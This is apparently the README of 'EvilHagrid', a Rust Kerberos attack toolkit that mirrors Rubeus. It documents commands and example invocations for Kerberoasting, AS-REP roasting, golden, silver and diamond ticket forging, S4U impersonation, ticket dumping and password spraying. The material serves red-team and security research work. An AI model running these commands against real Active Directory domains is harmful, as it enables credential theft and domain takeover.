# EvilHagrid

```
  _____       _ _ _    _                     _     _
 | ____|_   _(_) | |  | | __ _  __ _ _ __  (_) __| |
 |  _| \ \ / / | | |  | |/ _` |/ _` | '__|  | |/ _` |
 | |___ \ V /| | | |__| | (_| | (_| | |     | | (_| |
 |_____| \_/ |_|_|\____/ \__,_|\__, |_|     |_|\__,_|
                                |___/
         Kerberos Toolkit  —  Rust Edition
```

A Kerberos interaction and manipulation toolkit written in Rust. EvilHagrid provides
offensive-security capabilities over the Kerberos V5 protocol (RFC 4120) — from raw
ticket requests to golden/silver ticket forging, delegation abuse, and credential
extraction.

> **For authorized security research, red-team engagements, and CTF environments only.**

---

## Features

- Full Kerberos V5 protocol stack implemented from scratch (no MIT krb5 / SSPI dependency)
- Custom ASN.1 DER encoder/decoder for all KDC message types
- RC4-HMAC (etype 23), AES-128 and AES-256 CTS-HMAC-SHA1-96 (etypes 17/18)
- MD4 NT hash, AES string-to-key (PBKDF2 + n-fold), HMAC-MD5 / HMAC-SHA1-96
- UDP/TCP KDC transport with automatic fallback
- Cross-platform: compiles on Linux, macOS, and Windows
- Windows-specific features (LSA import/purge) use conditional compilation and fail gracefully on other platforms
- MIT krb5 ccache v3/v4 binary parser for Linux/macOS ticket enumeration
- KRB-CRED (.kirbi) read/write for ticket portability

---

## Build

Requires **Rust 1.75+**.

```bash
git clone https://github.com/w41l3r/EvilHagrid.git
cd EvilHagrid
cargo build --release
# binary: target/release/hagrid
```

On Windows, the `windows` crate adds LSA functionality automatically — no extra flags needed.

---

## Usage

```
hagrid <spell> [/flag:value ...]
```

Global flags available on any spell:

| Flag | Effect |
|------|--------|
| `/nowrap` | Disable colour output |
| `/debug` | Print parsed arguments to stderr |

---

## Spells

### Ticket Acquisition

| Spell | Description |
|-------|-------------|
| `accio-tgt` | Request a TGT. `/user:` `/domain:` `/password:` or `/rc4:` or `/aes256:` `[/dc:]` `[/outfile:]` |
| `accio-service` | Request a service ticket. `/ticket:` `/spn:` `/domain:` `[/etype:rc4\|aes256]` `[/dc:]` `[/outfile:]` |
| `reparo` | Renew a TGT. `/ticket:` `/domain:` `[/dc:]` |
| `confundus` | Obtain a delegable TGT for the current user without elevation (TGTdeleg) |

### Roasting

| Spell | Description |
|-------|-------------|
| `roasting-feast` | Kerberoast service accounts. `/spn:` or `/spns:` `/ticket:` `/domain:` `[/rc4]` `[/format:hashcat\|john]` `[/outfile:]` `[/delay:ms]` |
| `preauth-feast` | AS-REP roast accounts without pre-auth. `/user:` or `/users:` `/domain:` `[/dc:]` `[/aes]` `[/format:hashcat\|john]` `[/outfile:]` |
| `sorting-hat` | Scan LDAP for AS-REP roastable accounts. `/domain:` `[/ldap:]` `[/dc:]` |

### Ticket Forging

| Spell | Description |
|-------|-------------|
| `elder-wand` | Forge a Golden Ticket. `/user:` `/domain:` `/sid:` `/rc4:` or `/aes256:` `[/groups:]` `[/id:]` `[/outfile:]` |
| `dark-mark` | Forge a Silver Ticket. `/user:` `/domain:` `/sid:` `/rc4:` or `/aes256:` `/spn:` `[/id:]` `[/outfile:]` |
| `philosophers-stone` | Diamond ticket: request a real TGT then modify the PAC in-place. `/user:` `/domain:` `/rc4:` or `/aes256:` `/sid:` `[/dc:]` |

### Delegation

| Spell | Description |
|-------|-------------|
| `polyjuice` | S4U2Self + S4U2Proxy constrained delegation. `/impersonate:` `/spn:` `/ticket:` `/domain:` `[/targetspn:]` `[/dc:]` |
| `imperius` | Substitute the sname in a service ticket (tgssub). `/ticket:` `/altservice:` `[/outfile:]` |

### Credential Operations

| Spell | Description |
|-------|-------------|
| `transfigure` | Compute Kerberos key hashes. `/password:` `/user:` `/domain:` `[/dc:]` |
| `alohomora` | Change a user's password via kpasswd (RFC 3244). `/ticket:` `/newpassword:` `/domain:` `[/dc:]` |
| `crucio` | Kerberos password spray. `/users:` (file) `/password:` `/domain:` `[/dc:]` `[/delay:ms]` |

### Ticket Management (Windows + cross-platform)

| Spell | Description |
|-------|-------------|
| `census` | List Kerberos tickets across sessions. `[/luid:]` `[/service:]` `[/ccache:]` |
| `manifest` | List tickets verbosely. `[/luid:]` `[/service:]` |
| `portkey` | Import a ticket into the current session (ptt). `/ticket:` (base64 kirbi) — Windows only |
| `obliviate` | Purge tickets from a logon session. `[/luid:]` — Windows only |
| `pillage` | Export cached tickets to disk. `[/luid:]` `[/service:]` `[/outdir:]` — Windows only |
| `session-map` | Enumerate logon sessions. `[/luid:]` — Windows only |
| `whomst` | Display the current logon session LUID — Windows only |
| `marauders-map` | Monitor for new TGTs in the current session. `[/interval:seconds]` — Windows only |
| `reaping` | Harvest and auto-renew TGTs. `/domain:` `/password:` or `/rc4:` `[/interval:seconds]` `[/dc:]` |

### Conversion / Inspection

| Spell | Description |
|-------|-------------|
| `legilimens` | Parse and display the contents of a ticket. `/ticket:` (base64 kirbi) |
| `muggle` | Convert between base64 kirbi and binary `.kirbi` file. `/ticket:` or `/file:` `[/outfile:]` |
| `convert-muggle` | Convert a raw AS-REP response to a `.kirbi` file. `/asrep:` (base64) `[/outfile:]` |

### Process / Misc

| Spell | Description |
|-------|-------------|
| `fidelius` | Spawn a process with separate network credentials (createnetonly). `/program:` `[/username: /password: /domain:]` — Windows only |

---

## Rubeus Command Mapping

Complete correspondence between Rubeus (C#) commands and EvilHagrid spells.

| Rubeus Command | EvilHagrid Spell | Status | Notes |
|----------------|-----------------|--------|-------|
| `asktgt` | `accio-tgt` | ✅ Full | AS-REQ flow, preauth probe, ETYPE_INFO2 salt extraction |
| `asktgs` | `accio-service` | ✅ Full | TGS-REQ with AP-REQ authenticator |
| `kerberoast` | `roasting-feast` | ✅ Full | RC4 + AES hashes, hashcat/john output, delay |
| `asreproast` | `preauth-feast` | ✅ Full | No-preauth AS-REQ, hashcat/john output |
| `golden` | `elder-wand` | ✅ Full | PAC forging with KERB_VALIDATION_INFO + NDR |
| `silver` | `dark-mark` | ✅ Full | Silver ticket with custom SPN |
| `diamond` | `philosophers-stone` | ✅ Full | Request real TGT + PAC modification |
| `ptt` | `portkey` | ✅ Full | `LsaCallAuthenticationPackage` — Windows only |
| `purge` | `obliviate` | ✅ Full | `KerbPurgeTicketCacheExMessage` — Windows only |
| `dump` | `pillage` | ✅ Full | Export .kirbi files — Windows only |
| `triage` | `census` | ✅ Full | LSA (Windows) + ccache parser (Linux/macOS) |
| `klist` | `manifest` | ⚙️ Stub | Verbose ticket listing — Windows only |
| `s4u` | `polyjuice` | ✅ Full | S4U2Self + S4U2Proxy, PA-FOR-USER HMAC-MD5 |
| `tgssub` | `imperius` | ✅ Full | sname substitution in existing ticket |
| `renew` | `reparo` | ✅ Full | TGS-REQ with `KDC_OPT_RENEW` |
| `describe` | `legilimens` | ✅ Full | Decode and display all ticket fields |
| `hash` | `transfigure` | ✅ Full | NT hash, AES-128/256 string-to-key |
| `changepw` | `alohomora` | ⚙️ Stub | RFC 3244 kpasswd (port 464) skeleton |
| `brute` | `crucio` | ✅ Full | Per-user AS-REQ spray with delay |
| `harvest` | `reaping` | ✅ Full | TGT loop with auto-renew |
| `monitor` | `marauders-map` | ⚙️ Stub | Poll for new TGTs — Windows only |
| `logonsessions` | `session-map` | ⚙️ Stub | `LsaEnumerateLogonSessions` — Windows only |
| `currentluid` | `whomst` | ⚙️ Stub | Current session LUID — Windows only |
| `createnetonly` | `fidelius` | ⚙️ Stub | `CreateProcessWithLogonW` — Windows only |
| `kirbi2john` / `base64` | `muggle` | ✅ Full | kirbi ↔ binary ↔ base64 conversion |
| `pkinit` | `philosophers-stone` / `key-ceremony` | ⚙️ Stub | PKINIT / Diffie-Hellman — not yet implemented |
| `tgtdeleg` | `confundus` | ⚙️ Stub | Unconstrained delegation TGT — not yet implemented |
| `asktgt` (with /getcredentials) | `sorting-hat` | ⚙️ Stub | LDAP scan for no-preauth accounts |
| *(no equivalent)* | `convert-muggle` | ✅ Full | Raw AS-REP bytes → .kirbi |

**Status legend:**  ✅ Full implementation &nbsp;·&nbsp; ⚙️ Stub (compiles, meaningful error, structure ready)

---

## Examples

```bash
# Request a TGT with an NT hash
hagrid accio-tgt /user:alice /domain:corp.local /rc4:aabbccddeeff00112233445566778899

# Kerberoast all SPNs from a kirbi TGT
hagrid roasting-feast /spns:spns.txt /ticket:tgt.b64 /domain:corp.local /format:hashcat

# AS-REP roast a list of usernames
hagrid preauth-feast /users:users.txt /domain:corp.local /dc:dc01.corp.local

# Forge a Golden Ticket
hagrid elder-wand /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-1234567890-1234567890-1234567890 \
  /rc4:aabbccddeeff00112233445566778899

# S4U2Proxy with an existing TGT
hagrid polyjuice /impersonate:administrator /spn:cifs/fileserver \
  /ticket:tgt.b64 /domain:corp.local

# List tickets in current ccache
hagrid census

# List tickets from a specific ccache file
hagrid census /ccache:/tmp/krb5cc_1000

# Inspect a kirbi file
hagrid legilimens /ticket:$(base64 -w0 ticket.kirbi)

# Password spray
hagrid crucio /users:users.txt /password:Summer2024! /domain:corp.local /delay:500
```

---

## Architecture

```
src/
├── main.rs                    # Entry point, banner, dispatch
├── about.rs                   # Version banner
├── incantation.rs             # Argument parser (/flag:value syntax)
├── spell_book.rs              # Spell registry and dispatcher
├── spells/                    # One file per spell (28 total)
│   ├── mod.rs                 # Spell trait definition
│   └── *.rs
└── dungeon/                   # Core library
    ├── krb_structures/
    │   ├── constants.rs       # Kerberos constants (etypes, tags, flags, errors)
    │   ├── der.rs             # Custom ASN.1 DER encoder/decoder
    │   ├── principal.rs       # PrincipalName (Glyph)
    │   ├── enc_types.rs       # EncryptedData, EncryptionKey, Checksum
    │   ├── pa_data.rs         # PA-DATA, ETYPE-INFO2, EncTimestamp
    │   ├── ticket.rs          # Ticket, EncTicketPart, KRB-CRED (kirbi)
    │   ├── kdc_req.rs         # AS-REQ, TGS-REQ, AS-REP, TGS-REP
    │   └── krb_error.rs       # KRB-ERROR
    ├── potions.rs             # Cryptography: RC4-HMAC, AES-CTS, string-to-key, MD4
    ├── floo_network.rs        # KDC transport: UDP/TCP, DNS lookup
    ├── wand_utils.rs          # Hex/base64, kirbi helpers, timestamps, nonce
    ├── display_charm.rs       # ASCII tables, coloured output
    ├── request_magic.rs       # AS-REQ/TGS-REQ flows, AP-REQ building
    ├── cauldron.rs            # Kerberoasting and AS-REP roasting
    ├── dark_arts.rs           # Golden/Silver/Diamond ticket forging, PAC
    ├── ministry.rs            # LSA (Windows) + ccache (Linux/macOS) ticket ops
    ├── polyjuice_brew.rs      # S4U2Self, S4U2Proxy, PA-FOR-USER
    ├── mending.rs             # Ticket renewal
    ├── crucio_cast.rs         # Password spray
    ├── reaper.rs              # TGT harvesting
    ├── memory_charm.rs        # kpasswd (RFC 3244)
    ├── key_ceremony.rs        # PKINIT stub
    └── dark_arts.rs           # Ticket forging + PAC construction
```

---

## Supported Encryption Types

| Etype | Name | Notes |
|-------|------|-------|
| 23 | RC4-HMAC | MD4 NT hash, HMAC-MD5, RC4 keystream |
| 18 | AES-256-CTS-HMAC-SHA1-96 | CTS mode, PBKDF2 string-to-key |
| 17 | AES-128-CTS-HMAC-SHA1-96 | CTS mode, PBKDF2 string-to-key |

---

## Requirements

| Platform | Status |
|----------|--------|
| Linux | Full (ccache-based ticket ops) |
| macOS | Full (ccache-based ticket ops) |
| Windows | Full (LSA + ccache) |

---

## License

BSD-3-Clause
